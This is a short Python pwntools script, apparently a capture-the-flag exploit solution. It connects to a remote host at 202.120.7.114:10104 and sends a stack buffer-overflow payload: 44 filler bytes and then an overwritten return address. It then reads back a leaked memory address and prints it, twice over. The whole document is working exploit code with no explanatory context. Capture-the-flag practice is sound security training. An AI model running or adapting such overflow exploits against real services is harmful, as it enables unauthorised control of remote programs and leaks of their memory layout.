from pwn import *

r = remote('202.120.7.114', 10104)
payload = 'j' * (0x28 + 4) + p32(0x8048490)

r.sendline(payload)
r.recvuntil('at ')
addr = r.recvuntil('.')
print addr[:-1]

r.sendline(payload)
r.recvuntil('at ')
addr = r.recvuntil('.')
print addr[:-1]
